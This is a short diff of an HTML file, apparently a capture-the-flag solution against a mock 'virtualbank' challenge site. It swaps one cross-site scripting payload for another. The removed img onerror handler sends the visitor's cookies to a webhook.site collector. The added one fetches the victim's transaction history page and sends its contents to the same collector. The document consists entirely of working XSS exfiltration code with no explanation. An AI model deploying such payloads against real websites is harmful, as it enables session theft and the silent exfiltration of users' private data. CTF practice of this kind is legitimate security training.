@@ -1,4 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="en">
-<img src="x" onerror="this.src='http://webhook.site/ee7e160b-3a01-4a1e-8452-45d8221902e1?cookie='+document.cookie;">
+<img src="x" onerror="
+  fetch('http://virtualbank.challs.olicyber.it/history/1')
+    .then(r => r.text())
+    .then(t => {
+      this.src='http://webhook.site/ee7e160b-3a01-4a1e-8452-45d8221902e1?data='+encodeURIComponent(t);
+    });
+">
